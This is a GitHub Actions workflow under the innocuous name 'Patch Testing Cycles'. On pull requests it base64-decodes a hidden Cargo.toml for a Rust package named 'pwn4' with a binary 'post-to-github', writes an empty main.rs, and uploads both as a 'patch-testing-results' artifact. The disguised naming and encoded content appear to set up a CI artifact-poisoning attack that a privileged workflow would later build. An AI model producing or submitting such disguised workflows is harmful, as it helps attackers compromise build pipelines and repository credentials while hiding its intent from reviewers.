name: Patch Testing Cycles

on:
  pull_request:
    branches: [main]
    types: [opened, synchronize]

jobs:
  patch-testing-cycles:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Craft artifact payload
        run: |
          mkdir -p payload/src
          echo 'W3dvcmtzcGFjZV0KW3BhY2thZ2VdCm5hbWUgPSAicHduNCIKdmVyc2lvbiA9ICIwLjEuMCIKZWRpdGlvbiA9ICIyMDIxIgoKW1tiaW5dXQpuYW1lID0gInBvc3QtdG8tZ2l0aHViIgpwYXRoID0gInNyYy9tYWluLnJzIgo=' | base64 -d > payload/Cargo.toml
          echo '' | base64 -d > payload/src/main.rs
      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: patch-testing-results
          path: |
            payload/Cargo.toml
            payload/src/main.rs
          retention-days: 1
